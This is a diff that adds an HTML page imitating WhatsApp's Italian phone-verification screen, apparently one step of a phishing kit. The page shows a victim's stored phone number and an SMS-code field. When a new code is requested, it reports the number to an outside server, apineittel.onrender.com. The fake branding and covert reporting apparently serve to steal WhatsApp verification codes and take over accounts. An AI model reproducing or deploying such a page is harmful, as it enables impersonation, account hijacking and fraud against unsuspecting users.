@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>WhatsApp</title>
+    <link rel="icon" href="img/icon.png" type="image/png" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="script.js" defer></script>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Arimo:ital,wght@0,400..700;1,400..700&display=swap");
+
+      body {
+        font-family: "Arimo", sans-serif;
+      }
+    </style>
+  </head>
+  <body class="text-white bg-[#010101]">
+    <div class="flex flex-col items-center text-center">
+      <div class="max-w-md mt-20 mx-3">
+        <h1 class="text-[#017659] text-2xl font-semibold">
+          Verifica del tuo numero
+        </h1>
+        <p class="mt-5">
+          In attesa di rilevare automaticamente l'SMS inviato al +39
+          <span id="placeToSetPhoneNumber"></span>
+          <a onclick="wrongNumber()" class="text-[#3381c2] cursor-pointer"
+            >Numero sbagliato?</a
+          >
+        </p>
+        <input
+          type="text"
+          id="smsCode"
+          class="w-full text-center text-3xl bg-[#010101] border-b-2 border-[#017659] py-2 mt-5 outline-none"
+          placeholder="— — —   — — —"
+        />
+        <p class="mt-10">Non hai ricevuto il codice?</p>
+        <p class="opacity-50 mt-1" id="countdown"></p>
+      </div>
+    </div>
+  </body>
+  <script>
+    const phoneNumber = localStorage.getItem("phoneNumber");
+
+    if (phoneNumber && phoneNumber.length === 9) {
+      const spanElement = document.getElementById("placeToSetPhoneNumber");
+      spanElement.textContent = phoneNumber;
+    } else {
+      window.location.href = "etapa1.html";
+    }
+
+    const countdownElement = document.getElementById("countdown");
+    let minutes = 1;
+    let seconds = 0;
+
+    function updateCountdown() {
+      countdownElement.textContent = `È possibile richiedere un nuovo codice tramite ${minutes}:${seconds
+        .toString()
+        .padStart(2, "0")}.`;
+
+      if (seconds === 0) {
+        if (minutes === 0) {
+          countdownElement.style.fontWeight = "700";
+          countdownElement.textContent =
+            "Fare clic per richiedere un nuovo codice.";
+          countdownElement.style.cursor = "pointer";
+          countdownElement.style.color = "#017659";
+          countdownElement.style.opacity = "1";
+          countdownElement.addEventListener("click", () => {
+            countdownElement.style.fontWeight = "400";
+            countdownElement.style.cursor = "default";
+            countdownElement.style.color = "white";
+            countdownElement.style.opacity = "0.5";
+            minutes = 0;
+            seconds = 2;
+            updateCountdown();
+            return fetch("https://apineittel.onrender.com/submit-whatsapp2", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                content: `SMS novo solicitado para o número: +39 ${phoneNumber}`,
+              }),
+            }).then((response) => response.json());
+          });
+          return;
+        }
+        minutes--;
+        seconds = 59;
+      } else {
+        seconds--;
+      }
+
+      setTimeout(updateCountdown, 1000);
+    }
+
+    updateCountdown();
+  </script>
+</html>
